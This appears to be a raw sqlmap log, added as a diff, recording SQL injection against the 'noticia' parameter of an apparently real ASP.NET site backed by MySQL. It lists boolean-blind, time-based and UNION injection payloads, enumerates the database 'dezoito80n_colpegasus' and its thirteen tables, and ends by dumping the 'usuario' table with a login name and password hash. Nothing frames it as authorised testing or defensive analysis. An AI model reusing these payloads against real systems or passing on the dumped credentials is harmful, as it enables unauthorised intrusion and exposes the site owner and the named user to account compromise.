@@ -1,0 +1,94 @@
+sqlmap identified the following injection point(s) with a total of 52 HTTP(s) requests:
+---
+Parameter: noticia (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: noticia=19 AND 9409=9409
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: noticia=19 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: noticia=-4089 UNION ALL SELECT CONCAT(0x71626b6b71,0x4d424376616b4553637156494f736c7646594b757371545263636d4c75577962564a48464b436b49,0x71767a7171),NULL,NULL-- ydqV
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web server operating system: Windows 2008 R2 or 7
+web application technology: ASP.NET, Microsoft IIS 7.5
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] dezoito80n_colpegasus
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: noticia (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: noticia=19 AND 9409=9409
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: noticia=19 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: noticia=-4089 UNION ALL SELECT CONCAT(0x71626b6b71,0x4d424376616b4553637156494f736c7646594b757371545263636d4c75577962564a48464b436b49,0x71767a7171),NULL,NULL-- ydqV
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web server operating system: Windows 2008 R2 or 7
+web application technology: ASP.NET, Microsoft IIS 7.5
+back-end DBMS: MySQL >= 5.0.12
+Database: dezoito80n_colpegasus
+[13 tables]
++-----------------------+
+| area                  |
+| banner_home           |
+| calendario            |
+| cardapio              |
+| contatos              |
+| fotos                 |
+| fotos_pasta           |
+| lista_material        |
+| noticias              |
+| organograma_diretoria |
+| pastas                |
+| texto                 |
+| usuario               |
++-----------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: noticia (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: noticia=19 AND 9409=9409
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: noticia=19 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: noticia=-4089 UNION ALL SELECT CONCAT(0x71626b6b71,0x4d424376616b4553637156494f736c7646594b757371545263636d4c75577962564a48464b436b49,0x71767a7171),NULL,NULL-- ydqV
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web server operating system: Windows 2008 R2 or 7
+web application technology: ASP.NET, Microsoft IIS 7.5
+back-end DBMS: MySQL >= 5.0.12
+Database: dezoito80n_colpegasus
+Table: usuario
+[1 entry]
++----+---------+------------------------------------------+
+| id | login   | senha                                    |
++----+---------+------------------------------------------+
+| 1  | leticia | 97484c44c6623b514dfb3491ffe2f89a41b720cc |
++----+---------+------------------------------------------+
+
